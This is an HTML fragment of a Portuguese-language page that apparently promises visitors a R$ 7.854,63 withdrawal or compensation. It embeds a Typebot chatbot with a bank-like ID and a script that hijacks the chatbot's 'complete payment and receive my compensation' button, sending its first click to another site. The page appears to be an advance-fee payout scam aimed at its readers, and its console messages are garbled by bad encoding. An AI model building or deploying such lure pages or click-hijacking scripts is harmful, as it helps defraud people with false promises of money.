                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>

<script type="module">
  import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

  Typebot.initStandard({
    typebot: "nub-1-mcrdbzs",
    apiHost: "https://chat.typezap.site",
  });
</script>

<typebot-standard></typebot-standard>
</div></div></div></main></div></main>
<script>
console.log("üõ°Ô∏è Monitorando shadow DOM do Typebot com captura para interceptar o primeiro clique...");

setInterval(() => {
  const redirecionarPara = 'https://google.com';
  const typebots = document.querySelectorAll('typebot-standard');

  typebots.forEach((typebot, idx) => {
    const root = typebot.shadowRoot;
    if (!root) {
      console.log(`‚è≥ ShadowRoot ainda n√£o dispon√≠vel no typebot[${idx}]`);
      return;
    }

    const alvos = root.querySelectorAll('*');
    alvos.forEach(el => {
      const texto = el.textContent?.trim();
      if (
        texto &&
        texto.includes('Concluir pagamento e receber minha indeniza√ß√£o') &&
        !el.dataset._redirectHandled
      ) {
        el.dataset._redirectHandled = "true";
        console.log(`üéØ Elemento com texto encontrado: "${texto}"`, el);

        let elementoClicavel = el.closest('button, a, div');
        if (elementoClicavel) {
          elementoClicavel.removeAttribute('href');
          elementoClicavel.removeAttribute('onclick');

          // ‚õî Captura de clique com capture: true
          elementoClicavel.addEventListener('click', e => {
            e.preventDefault();
            e.stopImmediatePropagation();
            console.log('‚õî Redirecionamento original bloqueado no primeiro clique!');
            window.location.href = redirecionarPara;
          }, true);

          console.log('‚úÖ Intercepta√ß√£o com captura configurada!');
        } else {
          console.warn('‚ö†Ô∏è N√£o foi poss√≠vel encontrar um elemento clic√°vel para:', el);
        }
      }
    });
  });
}, 1000);
</script>
